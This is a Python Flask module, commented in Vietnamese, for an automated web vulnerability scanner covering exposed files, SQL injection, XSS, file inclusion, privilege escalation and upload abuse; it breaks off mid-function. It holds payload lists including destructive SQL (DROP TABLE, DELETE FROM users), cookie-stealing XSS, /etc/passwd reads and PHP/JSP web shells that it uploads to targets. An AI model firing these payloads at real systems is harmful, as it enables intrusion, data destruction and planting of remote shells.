from datetime import datetime
import re, time, random, requests, logging
from flask import request, jsonify
from models.Task import Task
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ========== CẤU HÌNH ==========
USER_AGENT = "SecurityScanner/2.0"
DEFAULT_TIMEOUT = 7
REQUEST_DELAY_MIN = 0.5
REQUEST_DELAY_MAX = 1.2

# ========== LOGGING ==========
logging.basicConfig(
    filename='scanner.log', 
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s'
)

def log_error(url, error, status_code=None):
    msg = f"URL: {url} | Status: {status_code} | Error: {error}"
    logging.error(msg)

def log_info(message):
    logging.info(message)

# ========== HTTP SESSION ==========
def create_session():
    session = requests.Session()
    session.headers.update({
        "User-Agent": USER_AGENT,
        "Accept": "*/*"
    })
    
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=frozenset(["GET", "POST"])
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def get_request_delay():
    return random.uniform(REQUEST_DELAY_MIN, REQUEST_DELAY_MAX)

# ========== URL CLASSIFICATION ==========
def classify_url(url: str):
    """
    Phân loại URL thành 3 nhóm chính:
    1. Static URL - Quét static holes
    2. Dynamic URL - Quét dynamic holes  
    3. Abusaly URL - Quét business logic abuse
    """
    SHORTENED_DOMAINS = {"bit.ly", "goo.gl", "tinyurl.com", "t.co", "ow.ly"}
    result = []
    url = (url or "").strip()
    
    if not url:
        return ["no_url_provided"]

    parsed = urlparse(url)
    domain = parsed.netloc.lower().split(":")[0] if parsed.netloc else None
    path = parsed.path.lower()

    # Kiểm tra absolute/relative
    if parsed.scheme and parsed.netloc:
        result.append("absolute_url")
    else:
        result.append("relative_url")

    # 1. STATIC URL - các đặc điểm
    static_indicators = [
        not parsed.query,  # Không có query string
        path.endswith(('.html', '.htm', '.php', '.asp', '.jsp')),
        re.match(r'^/[\w\-/]*$', path),  # Chỉ có chữ cái, số, dash
    ]
    
    # 2. DYNAMIC URL - các đặc điểm
    dynamic_indicators = [
        bool(parsed.query),  # Có query parameters
        re.search(r'/\d+', path),  # Có ID số trong path
        re.search(r'\?.*=', url),  # Có parameter=value
        'search' in path or 'query' in path or 'filter' in path
    ]
    
    # 3. ABUSALY URL - các đặc điểm (API endpoints, business logic)
    abusaly_indicators = [
        '/api/' in path,
        '/v1/' in path or '/v2/' in path or '/v3/' in path,
        any(x in path for x in ['/user', '/account', '/order', '/payment', '/cart', 
                                 '/checkout', '/admin', '/profile', '/settings']),
        any(x in path for x in ['/create', '/update', '/delete', '/edit', '/modify']),
        'Content-Type: application/json' in str(session.headers) if 'session' in locals() else False
    ]

    # Phân loại dựa trên indicators
    static_score = sum(static_indicators)
    dynamic_score = sum(dynamic_indicators)
    abusaly_score = sum(abusaly_indicators)
    
    # Ưu tiên: Abusaly > Dynamic > Static
    if abusaly_score >= 1:
        result.append("abusaly_url")
    if dynamic_score >= 1:
        result.append("dynamic_url")
    if static_score >= 2 or (not parsed.query and abusaly_score == 0):
        result.append("static_url")

    # Kiểm tra shortened URL
    if domain and domain in SHORTENED_DOMAINS:
        result.append("shortened_url")
    
    return result

def get_base_url(parsed):
    if parsed.scheme and parsed.netloc:
        return f"{parsed.scheme}://{parsed.netloc}"
    raise ValueError("URL không phải absolute URL")

# ========== JSON BODY DETECTOR ==========
def detect_json_body(target_url):
    session = create_session()
    
    try:
        test_data = {}
        resp = session.post(target_url, json=test_data, timeout=DEFAULT_TIMEOUT)
        
        if resp.status_code != 415:
            content_lower = resp.content.lower()
            json_indicators = [
                b'"' in resp.content,
                b'application/json' in content_lower,
                resp.status_code in [200, 201, 400, 401, 403, 422]
            ]
            
            if any(json_indicators):
                return True, resp.status_code
    
    except Exception as e:
        log_error(target_url, f"JSON detection error: {str(e)}")
    
    return False, None

# ========================================================
# STATIC HOLE SCANNER
# ========================================================
def scan_static_holes(base_url):
    """
    Quét lỗ hổng Static:
    1. Information Disclosure
    2. Directory Listing
    3. Misconfiguration
    """
    vulnerabilities = []
    
    # 1. Information Disclosure
    info_disclosure = scan_information_disclosure(base_url)
    vulnerabilities.extend(info_disclosure)
    
    # 2. Directory Listing
    dir_listing = scan_directory_listing(base_url)
    vulnerabilities.extend(dir_listing)
    
    # 3. Misconfiguration
    misconfig = scan_misconfiguration(base_url)
    vulnerabilities.extend(misconfig)
    
    return {
        "scan_type": "static_holes",
        "target": base_url,
        "vulnerabilities": vulnerabilities,
        "summary": {
            "vulnerable_count": len(vulnerabilities),
            "info_disclosure": len([v for v in vulnerabilities if v['category'] == 'Information Disclosure']),
            "dir_listing": len([v for v in vulnerabilities if v['category'] == 'Directory Listing']),
            "misconfiguration": len([v for v in vulnerabilities if v['category'] == 'Misconfiguration'])
        }
    }

def scan_information_disclosure(base_url):
    """Quét file/comment nhạy cảm bị lộ"""
    vulnerabilities = []
    
    sensitive_files = [
        "robots.txt", ".env", ".env.local", ".env.production", ".env.backup",
        ".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD",
        ".svn/entries", ".svn/wc.db",
        "composer.json", "composer.lock", "package.json", "package-lock.json",
        "yarn.lock", "pom.xml", "build.gradle", "requirements.txt",
        ".DS_Store", "Thumbs.db", "desktop.ini",
        "phpinfo.php", "info.php", "test.php",
        ".htaccess", ".htpasswd", "web.config",
        "backup.sql", "database.sql", "dump.sql",
        "README.md", "CHANGELOG.md", "TODO.txt",
        ".dockerenv", "Dockerfile", "docker-compose.yml"
    ]
    
    # Thêm backup extensions
    parsed = urlparse(base_url)
    path_parts = parsed.path.strip('/').split('/')
    current_file = path_parts[-1] if path_parts and path_parts[-1] else None
    
    if current_file:
        for ext in [".bak", ".old", ".orig", ".save", ".tmp", ".backup", 
                    ".zip", ".tar.gz", ".rar", ".7z", ".sql", ".db"]:
            sensitive_files.append(f"{current_file}{ext}")
    
    base = get_base_url(parsed)
    session = create_session()
    
    log_info(f"[Static] Quét Information Disclosure: {base_url}")
    
    for filename in sensitive_files:
        try:
            time.sleep(get_request_delay())
            test_url = urljoin(base, filename.lstrip('/'))
            resp = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
            
            if resp.status_code == 200 and len(resp.content) > 10:
                content_preview = resp.content[:256].lower()
                
                # Bỏ qua HTML error pages
                if b'<html' in content_preview or b'<!doctype' in content_preview:
                    continue
                
                preview = resp.content[:200].decode('utf-8', errors='replace')
                vulnerabilities.append({
                    "category": "Information Disclosure",
                    "type": "Sensitive File Exposed",
                    "url": test_url,
                    "file": filename,
                    "status": "VULNERABLE",
                    "risk": "HIGH",
                    "evidence": f"File size: {len(resp.content)} bytes",
                    "preview": preview
                })
                
                log_info(f"⚠️ [Info Disclosure] Phát hiện: {test_url}")
        
        except Exception as e:
            continue
    
    return vulnerabilities

def scan_directory_listing(base_url):
    """Quét các thư mục có khả năng listing"""
    vulnerabilities = []
    
    common_dirs = [
        "backup/", "backups/", "old/", "temp/", "tmp/",
        "uploads/", "upload/", "files/", "images/", "media/",
        "config/", "configs/", "conf/", 
        "admin/", "administrator/", "wp-admin/",
        "test/", "tests/", "dev/", "development/",
        "api/", "assets/", "static/", "public/",
        "logs/", "log/", "cache/"
    ]
    
    parsed = urlparse(base_url)
    base = get_base_url(parsed)
    session = create_session()
    
    log_info(f"[Static] Quét Directory Listing: {base_url}")
    
    for dir_path in common_dirs:
        try:
            time.sleep(get_request_delay())
            test_url = urljoin(base, dir_path)
            resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                content = resp.content.decode('utf-8', errors='replace')
                
                # Dấu hiệu directory listing
                listing_indicators = [
                    "Index of" in content,
                    "Directory listing" in content,
                    "<title>Index of" in content,
                    "Parent Directory" in content,
                    "[To Parent Directory]" in content
                ]
                
                if any(listing_indicators):
                    vulnerabilities.append({
                        "category": "Directory Listing",
                        "type": "Directory Indexing Enabled",
                        "url": test_url,
                        "directory": dir_path,
                        "status": "VULNERABLE",
                        "risk": "MEDIUM",
                        "evidence": "Directory listing is enabled"
                    })
                    
                    log_info(f"⚠️ [Dir Listing] Phát hiện: {test_url}")
        
        except Exception as e:
            continue
    
    return vulnerabilities

def scan_misconfiguration(base_url):
    """Quét cấu hình sai hoặc file backup chưa xóa"""
    vulnerabilities = []
    
    misconfig_files = [
        ".env", ".git/config",
        "wp-config.php", "wp-config.php.bak",
        "config.php", "config.php.old",
        "database.yml", "database.php",
        "settings.py", "settings.php"
    ]
    
    parsed = urlparse(base_url)
    base = get_base_url(parsed)
    session = create_session()
    
    log_info(f"[Static] Quét Misconfiguration: {base_url}")
    
    for filename in misconfig_files:
        try:
            time.sleep(get_request_delay())
            test_url = urljoin(base, filename)
            resp = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
            
            if resp.status_code == 200 and len(resp.content) > 10:
                content_preview = resp.content[:256].lower()
                
                if b'<html' not in content_preview and b'<!doctype' not in content_preview:
                    vulnerabilities.append({
                        "category": "Misconfiguration",
                        "type": "Configuration File Exposed",
                        "url": test_url,
                        "file": filename,
                        "status": "VULNERABLE",
                        "risk": "CRITICAL",
                        "evidence": f"Config file accessible: {filename}"
                    })
                    
                    log_info(f"⚠️ [Misconfiguration] Phát hiện: {test_url}")
        
        except Exception as e:
            continue
    
    return vulnerabilities

# ========================================================
# DYNAMIC HOLE SCANNER
# ========================================================
def scan_dynamic_holes(target_url):
    """
    Quét lỗ hổng Dynamic:
    1. SQL Injection
    2. XSS (Cross-Site Scripting)
    3. LFI/RFI (File Inclusion)
    4. Broken Authentication
    5. IDOR
    """
    vulnerabilities = []
    
    # 1. SQL Injection
    sql_vulns = scan_sql_injection(target_url)
    vulnerabilities.extend(sql_vulns)
    
    # 2. XSS
    xss_vulns = scan_xss(target_url)
    vulnerabilities.extend(xss_vulns)
    
    # 3. LFI/RFI
    lfi_vulns = scan_file_inclusion(target_url)
    vulnerabilities.extend(lfi_vulns)
    
    # 4. Broken Authentication
    auth_vulns = scan_broken_authentication(target_url)
    vulnerabilities.extend(auth_vulns)
    
    # 5. IDOR
    idor_vulns = scan_idor_dynamic(target_url)
    vulnerabilities.extend(idor_vulns)
    
    return {
        "scan_type": "dynamic_holes",
        "target": target_url,
        "vulnerabilities": vulnerabilities,
        "summary": {
            "vulnerable_count": len(vulnerabilities),
            "sql_injection": len([v for v in vulnerabilities if v['category'] == 'SQL Injection']),
            "xss": len([v for v in vulnerabilities if v['category'] == 'XSS']),
            "lfi_rfi": len([v for v in vulnerabilities if v['category'] == 'LFI/RFI']),
            "broken_auth": len([v for v in vulnerabilities if v['category'] == 'Broken Authentication']),
            "idor": len([v for v in vulnerabilities if v['category'] == 'IDOR'])
        }
    }

def scan_sql_injection(target_url):
    """Quét SQL Injection với payloads nâng cao"""
    vulnerabilities = []
    
    sql_payloads = [
        # Basic SQLi
        "' OR '1'='1", "' OR 1=1--", "admin'--", "' OR 'a'='a",
        # Union-based
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", 
        "' UNION SELECT NULL,NULL,NULL--",
        "1' UNION SELECT username,password FROM users--",
        # Boolean-based
        "1' AND '1'='1", "1' AND '1'='2", "' AND 1=1--", "' AND 1=2--",
        # Time-based
        "'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--",
        "'; SELECT SLEEP(5)--", "' AND SLEEP(5) AND '1'='1",
        # Error-based
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        # Stacked queries
        "'; DROP TABLE users--", "1'; DELETE FROM users WHERE '1'='1"
    ]
    
    parsed = urlparse(target_url)
    query_params = parse_qs(parsed.query)
    
    if not query_params:
        return vulnerabilities
    
    session = create_session()
    log_info(f"[Dynamic] Quét SQL Injection: {target_url}")
    
    for param_name in query_params.keys():
        for payload in sql_payloads:
            try:
                time.sleep(get_request_delay())
                test_params = query_params.copy()
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                start_time = time.time()
                resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                elapsed = time.time() - start_time
                
                # Error-based detection
                sql_errors = [
                    b"sql syntax", b"mysql", b"postgresql", b"ora-", b"sqlite",
                    b"sqlstate", b"syntax error", b"unclosed quotation",
                    b"quoted string not properly terminated",
                    b"microsoft sql server", b"odbc sql server driver",
                    b"pg_query", b"supplied argument is not a valid mysql"
                ]
                
                for err in sql_errors:
                    if err in resp.content.lower():
                        vulnerabilities.append({
                            "category": "SQL Injection",
                            "type": "Error-based SQLi",
                            "parameter": param_name,
                            "payload": payload,
                            "url": test_url,
                            "status": "VULNERABLE",
                            "risk": "CRITICAL",
                            "evidence": f"SQL error detected: {err.decode()}"
                        })
                        log_info(f"⚠️ [SQLi] Phát hiện tại: {param_name}")
                        break
                
                # Time-based detection
                if elapsed > 4.5 and "SLEEP" in payload.upper():
                    vulnerabilities.append({
                        "category": "SQL Injection",
                        "type": "Time-based Blind SQLi",
                        "parameter": param_name,
                        "payload": payload,
                        "url": test_url,
                        "status": "VULNERABLE",
                        "risk": "HIGH",
                        "evidence": f"Response time: {elapsed:.2f}s (expected ~5s)"
                    })
                    log_info(f"⚠️ [SQLi Time-based] Phát hiện tại: {param_name}")
                
            except Exception as e:
                continue
    
    return vulnerabilities

def scan_xss(target_url):
    """Quét XSS với payloads đa dạng"""
    vulnerabilities = []
    
    xss_payloads = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        # Event handlers
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        # Obfuscated
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        # Filter bypass
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        # JavaScript protocols
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]
    
    parsed = urlparse(target_url)
    query_params = parse_qs(parsed.query)
    
    if not query_params:
        return vulnerabilities
    
    session = create_session()
    log_info(f"[Dynamic] Quét XSS: {target_url}")
    
    for param_name in query_params.keys():
        for payload in xss_payloads:
            try:
                time.sleep(get_request_delay())
                test_params = query_params.copy()
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                
                # Reflected XSS detection
                if payload.encode() in resp.content:
                    vulnerabilities.append({
                        "category": "XSS",
                        "type": "Reflected XSS",
                        "parameter": param_name,
                        "payload": payload,
                        "url": test_url,
                        "status": "VULNERABLE",
                        "risk": "HIGH",
                        "evidence": "Payload reflected in response without sanitization"
                    })
                    log_info(f"⚠️ [XSS] Phát hiện tại: {param_name}")
                    break
                
            except Exception as e:
                continue
    
    return vulnerabilities

def scan_file_inclusion(target_url):
    """Quét LFI/RFI"""
    vulnerabilities = []
    
    lfi_payloads = [
        # Linux LFI
        "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
        "....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
        "/etc/passwd", "etc/passwd",
        # Windows LFI
        "..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....\\\\....\\\\windows\\\\win.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        # PHP wrappers
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "data://text/plain,<?php system($_GET['cmd']); ?>",
        # Null byte
        "../../etc/passwd%00", "../../../etc/passwd\x00",
    ]
    
    parsed = urlparse(target_url)
    query_params = parse_qs(parsed.query)
    
    # Tìm parameters có khả năng là file path
    file_params = [k for k in query_params.keys() 
                   if any(x in k.lower() for x in ['file', 'path', 'page', 'include', 'template', 'doc'])]
    
    if not file_params:
        return vulnerabilities
    
    session = create_session()
    log_info(f"[Dynamic] Quét LFI/RFI: {target_url}")
    
    for param_name in file_params:
        for payload in lfi_payloads:
            try:
                time.sleep(get_request_delay())
                test_params = query_params.copy()
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                
                # Detection indicators
                lfi_indicators = [
                    b"root:", b"daemon:", b"[extensions]",
                    b"# hosts", b"Windows", b"127.0.0.1",
                    b"<?php", b"<script"
                ]
                
                for indicator in lfi_indicators:
                    if indicator in resp.content:
                        vulnerabilities.append({
                            "category": "LFI/RFI",
                            "type": "Local File Inclusion",
                            "parameter": param_name,
                            "payload": payload,
                            "url": test_url,
                            "status": "VULNERABLE",
                            "risk": "CRITICAL",
                            "evidence": f"File content detected: {indicator.decode()}"
                        })
                        log_info(f"⚠️ [LFI] Phát hiện tại: {param_name}")
                        break
                
            except Exception as e:
                continue
    
    return vulnerabilities

def scan_broken_authentication(target_url):
    """Quét lỗi xác thực: session ID, cookie giả, password reset"""
    vulnerabilities = []
    
    session = create_session()
    log_info(f"[Dynamic] Quét Broken Authentication: {target_url}")
    
    # Test 1: Session fixation
    try:
        resp1 = session.get(target_url, timeout=DEFAULT_TIMEOUT)
        cookies1 = session.cookies.get_dict()
        
        time.sleep(get_request_delay())
        resp2 = session.get(target_url, timeout=DEFAULT_TIMEOUT)
        cookies2 = session.cookies.get_dict()
        
        # Nếu session ID không đổi sau nhiều request
        if cookies1 == cookies2 and cookies1:
            vulnerabilities.append({
                "category": "Broken Authentication",
                "type": "Weak Session Management",
                "url": target_url,
                "status": "VULNERABLE",
                "risk": "MEDIUM",
                "evidence": "Session ID không thay đổi, có thể bị session fixation"
            })
    except Exception as e:
        pass
    
    # Test 2: Weak password reset
    parsed = urlparse(target_url)
    if any(x in parsed.path.lower() for x in ['reset', 'forgot', 'password']):
        vulnerabilities.append({
            "category": "Broken Authentication",
            "type": "Password Reset Flow",
            "url": target_url,
            "status": "NEEDS_MANUAL_CHECK",
            "risk": "HIGH",
            "evidence": "Phát hiện password reset endpoint - cần kiểm tra thủ công"
        })
    
    return vulnerabilities

def scan_idor_dynamic(target_url):
    """Quét IDOR trong URL động"""
    vulnerabilities = []
    
    test_ids = [1, 2, 3, 100, 999, 1000, 9999, "admin", "test"]
    parsed = urlparse(target_url)
    session = create_session()
    
    log_info(f"[Dynamic] Quét IDOR: {target_url}")
    
    # Test ID trong path
    if re.search(r'/\d+', parsed.path):
        responses = {}
        
        for test_id in test_ids:
            try:
                time.sleep(get_request_delay())
                test_path = re.sub(r'/\d+', f'/{test_id}', parsed.path)
                test_url = f"{parsed.scheme}://{parsed.netloc}{test_path}"
                if parsed.query:
                    test_url += f"?{parsed.query}"
                
                resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                
                if resp.status_code == 200:
                    responses[test_id] = len(resp.content)
            except Exception as e:
                continue
        
        # Nếu truy cập được nhiều IDs khác nhau
        if len(responses) >= 2:
            unique_sizes = set(responses.values())
            if len(unique_sizes) >= 2:
                vulnerabilities.append({
                    "category": "IDOR",
                    "type": "Insecure Direct Object Reference",
                    "url": target_url,
                    "status": "VULNERABLE",
                    "risk": "HIGH",
                    "evidence": f"Truy cập được {len(responses)} IDs khác nhau: {list(responses.keys())}"
                })
                log_info(f"⚠️ [IDOR] Phát hiện tại: {target_url}")
    
    return vulnerabilities

# ========================================================
# ABUSALY HOLE SCANNER
# ========================================================
def scan_abusaly_holes(target_url):
    """
    Quét lỗ hổng Business Logic Abuse:
    1. Privilege Escalation
    2. Mass Assignment
    3. API Security Issues
    4. CSRF
    5. File Upload Vulnerabilities
    6. Logic/Business Flow Bugs
    """
    vulnerabilities = []
    
    # 1. Privilege Escalation
    priv_vulns = scan_privilege_escalation(target_url)
    vulnerabilities.extend(priv_vulns)
    
    # 2. Mass Assignment
    mass_vulns = scan_mass_assignment(target_url)
    vulnerabilities.extend(mass_vulns)
    
    # 3. API Security
    api_vulns = scan_api_security(target_url)
    vulnerabilities.extend(api_vulns)
    
    # 4. CSRF
    csrf_vulns = scan_csrf(target_url)
    vulnerabilities.extend(csrf_vulns)
    
    # 5. File Upload
    upload_vulns = scan_file_upload_abuse(target_url)
    vulnerabilities.extend(upload_vulns)
    
    # 6. Business Logic
    logic_vulns = scan_business_logic(target_url)
    vulnerabilities.extend(logic_vulns)
    
    return {
        "scan_type": "abusaly_holes",
        "target": target_url,
        "vulnerabilities": vulnerabilities,
        "summary": {
            "vulnerable_count": len(vulnerabilities),
            "privilege_escalation": len([v for v in vulnerabilities if v['category'] == 'Privilege Escalation']),
            "mass_assignment": len([v for v in vulnerabilities if v['category'] == 'Mass Assignment']),
            "api_security": len([v for v in vulnerabilities if v['category'] == 'API Security']),
            "csrf": len([v for v in vulnerabilities if v['category'] == 'CSRF']),
            "file_upload": len([v for v in vulnerabilities if v['category'] == 'File Upload']),
            "business_logic": len([v for v in vulnerabilities if v['category'] == 'Business Logic'])
        }
    }

def scan_privilege_escalation(target_url):
    """Quét leo thang đặc quyền qua cookie/token/API"""
    vulnerabilities = []
    session = create_session()
    
    log_info(f"[Abusaly] Quét Privilege Escalation: {target_url}")
    
    # Test với các role cao
    privilege_payloads = [
        {"role": "admin"},
        {"role": "administrator"},
        {"is_admin": True},
        {"is_superuser": True},
        {"access_level": "admin"},
        {"permissions": ["admin", "write", "delete"]},
        {"user_type": "admin"},
        {"privilege": "admin"}
    ]
    
    for payload in privilege_payloads:
        try:
            time.sleep(get_request_delay())
            resp = session.post(target_url, json=payload, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code in [200, 201]:
                content = resp.content.decode('utf-8', errors='ignore').lower()
                
                if any(keyword in content for keyword in ['admin', 'elevated', 'superuser', 'privilege']):
                    vulnerabilities.append({
                        "category": "Privilege Escalation",
                        "type": "Role Manipulation",
                        "payload": payload,
                        "url": target_url,
                        "status": "VULNERABLE",
                        "risk": "CRITICAL",
                        "evidence": "Server chấp nhận privilege escalation payload"
                    })
                    log_info(f"⚠️ [Privilege Escalation] Phát hiện!")
                    break
        except Exception as e:
            continue
    
    return vulnerabilities

def scan_mass_assignment(target_url):
    """Quét Mass Assignment - thêm fields không được phép"""
    vulnerabilities = []
    session = create_session()
    
    log_info(f"[Abusaly] Quét Mass Assignment: {target_url}")
    
    dangerous_fields = {
        "is_admin": True,
        "is_verified": True,
        "is_active": True,
        "role": "admin",
        "balance": 999999,
        "credit": 999999,
        "price": 0,
        "discount": 100,
        "permissions": ["all"],
        "access_level": "admin"
    }
    
    try:
        time.sleep(get_request_delay())
        resp = session.post(target_url, json=dangerous_fields, timeout=DEFAULT_TIMEOUT)
        
        if resp.status_code in [200, 201]:
            content = resp.content.decode('utf-8', errors='ignore')
            
            accepted = [field for field in dangerous_fields.keys() if field in content]
            
            if accepted:
                vulnerabilities.append({
                    "category": "Mass Assignment",
                    "type": "Unrestricted Field Assignment",
                    "url": target_url,
                    "status": "VULNERABLE",
                    "risk": "HIGH",
                    "evidence": f"Server chấp nhận fields: {accepted[:5]}"
                })
                log_info(f"⚠️ [Mass Assignment] Phát hiện!")
    except Exception as e:
        pass
    
    return vulnerabilities

def scan_api_security(target_url):
    """Quét lỗ hổng API: rate limit, fuzzy param, schema"""
    vulnerabilities = []
    session = create_session()
    
    log_info(f"[Abusaly] Quét API Security: {target_url}")
    
    # Test 1: Rate limiting
    try:
        success_count = 0
        for i in range(20):
            resp = session.get(target_url, timeout=DEFAULT_TIMEOUT)
            if resp.status_code == 200:
                success_count += 1
        
        if success_count >= 15:
            vulnerabilities.append({
                "category": "API Security",
                "type": "No Rate Limiting",
                "url": target_url,
                "status": "VULNERABLE",
                "risk": "MEDIUM",
                "evidence": f"Gửi được {success_count}/20 requests không bị chặn"
            })
            log_info(f"⚠️ [API] Không có rate limit!")
    except Exception as e:
        pass
    
    # Test 2: Schema validation bypass (fuzzy parameters)
    fuzzy_payloads = [
        {"extra_field": "value"},
        {"id": [1, 2, 3]},
        {"amount": "not_a_number"},
        {"data": {"nested": {"deep": {"value": "test"}}}},
    ]
    
    for payload in fuzzy_payloads:
        try:
            time.sleep(get_request_delay())
            resp = session.post(target_url, json=payload, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code in [200, 201]:
                vulnerabilities.append({
                    "category": "API Security",
                    "type": "Weak Schema Validation",
                    "payload": payload,
                    "url": target_url,
                    "status": "VULNERABLE",
                    "risk": "MEDIUM",
                    "evidence": "API chấp nhận dữ liệu không đúng schema"
                })
                break
        except Exception as e:
            continue
    
    return vulnerabilities

def scan_csrf(target_url):
    """Quét CSRF - thiếu token bảo vệ"""
    vulnerabilities = []
    session = create_session()
    
    log_info(f"[Abusaly] Quét CSRF: {target_url}")
    
    # Kiểm tra POST request không có CSRF token
    try:
        test_data = {"test": "value"}
        resp = session.post(target_url, json=test_data, timeout=DEFAULT_TIMEOUT)
        
        if resp.status_code in [200, 201]:
            # Kiểm tra có yêu cầu CSRF token không
            if b'csrf' not in resp.content.lower() and b'token' not in resp.content.lower():
                vulnerabilities.append({
                    "category": "CSRF",
                    "type": "Missing CSRF Protection",
                    "url": target_url,
                    "status": "VULNERABLE",
                    "risk": "MEDIUM",
                    "evidence": "POST request không yêu cầu CSRF token"
                })
                log_info(f"⚠️ [CSRF] Không có bảo vệ CSRF!")
    except Exception as e:
        pass
    
    return vulnerabilities

def scan_file_upload_abuse(target_url):
    """Quét lỗ hổng upload file: PHP, shell, extension bypass"""
    vulnerabilities = []
    
    # Chỉ test nếu URL có liên quan đến upload
    if not any(keyword in target_url.lower() for keyword in ['/upload', '/file', '/attachment', '/media']):
        return vulnerabilities
    
    session = create_session()
    log_info(f"[Abusaly] Quét File Upload: {target_url}")
    
    dangerous_files = [
        ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php'),
        ('backdoor.php5', b'<?php eval($_POST["c"]); ?>', 'application/x-php'),
        ('test.phtml', b'<?php phpinfo(); ?>', 'application/x-php'),
        ('shell.jsp', b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
        ('web.config', b'<?xml version="1.0"?><configuration></configuration>', 'text/xml'),
        ('test.aspx', b'<% Response.Write("test"); %>', 'application/x-aspx'),
        ('.htaccess', b'AddType application/x-httpd-php .jpg', 'text/plain'),
    ]
    
    for filename, content, mime in dangerous_files:
        try:
            time.sleep(get_request_delay())
            files = {'file': (filename, content, mime)}
            resp = session.post(target_url, files=files, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code in [200, 201]:
                content_lower = resp.content.lower()
                
                if any(keyword in content_lower for keyword in [b'success', b'uploaded', b'complete']):
                    vulnerabilities.append({
                        "category": "File Upload",
                        "type": "Dangerous File Upload",
                        "filename": filename,
                        "url": target_url,
                        "status": "VULNERABLE",
                        "risk": "CRITICAL",
                        "evidence": f"File nguy hiểm được upload: {filename}"
                    })
                    log_info(f"⚠️ [File Upload] Upload được: {filename}")
        except Exception as e:
            continue
    
    return vulnerabilities

def scan_business_logic(target_url):
    """Quét lỗi logic nghiệp vụ: giá âm, số lượng âm, bypass validation"""
    vulnerabilities = []
    session = create_session()
    
    log_info(f"[Abusaly] Quét Business Logic: {target_url}")
    
    # Test bypass validation client
    logic_tests = [
        {"price": -1, "name": "Negative price"},
        {"price": 0, "name": "Zero price"},
        {"amount": -100, "name": "Negative amount"},
        {"quantity": -50, "name": "Negative quantity"},
        {"discount": 150, "name": "Over 100% discount"},
        {"age": -5, "name": "Negative age"},
        {"balance": -1000, "name": "Negative balance"},
    ]
    
    for test in logic_tests:
        try:
            time.sleep(get_request_delay())
            resp = session.post(target_url, json=test, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code in [200, 201]:
                vulnerabilities.append({
                    "category": "Business Logic",
                    "type": "Validation Bypass",
                    "payload": test,
                    "url": target_url,
                    "status": "VULNERABLE",
                    "risk": "HIGH",
                    "evidence": f"Server chấp nhận {test['name']}"
                })
                log_info(f"⚠️ [Business Logic] Phát hiện: {test['name']}")
        except Exception as e:
            continue
    
    # Test bypass số lượng trong order
    if any(keyword in target_url.lower() for keyword in ['order', 'cart', 'checkout', 'payment']):
        try:
            test_order = {
                "items": [{"id": 1, "quantity": -1}, {"id": 2, "quantity": 0}],
                "total": 0
            }
            resp = session.post(target_url, json=test_order, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code in [200, 201]:
                vulnerabilities.append({
                    "category": "Business Logic",
                    "type": "Order Manipulation",
                    "url": target_url,
                    "status": "VULNERABLE",
                    "risk": "CRITICAL",
                    "evidence": "Có thể đặt hàng với số lượng âm hoặc giá 0"
                })
                log_info(f"⚠️ [Business Logic] Order manipulation!")
        except Exception as e:
            pass
    
    return vulnerabilities

# ========== API ENDPOINT CHÍNH ==========
def handle_scan_request():
    """
    API endpoint chính để xử lý yêu cầu quét
    
    Request body:
    {
        "url": "https://example.com/api/user?id=1",
        "scan_types": ["static", "dynamic", "abusaly"]  // optional
    }
    """
    data = request.get_json()
    
    if not data:
        return jsonify({"error": "Request body phải là JSON"}), 400
    
    url = data.get("url")
    scan_types = data.get("scan_types", ["static", "dynamic", "abusaly"])
    
    if not url:
        return jsonify({"error": "Thiếu URL trong request"}), 400
    
    # Phân loại URL
    url_category = classify_url(url)
    
    # Reject relative URL
    if "relative_url" in url_category:
        return jsonify({
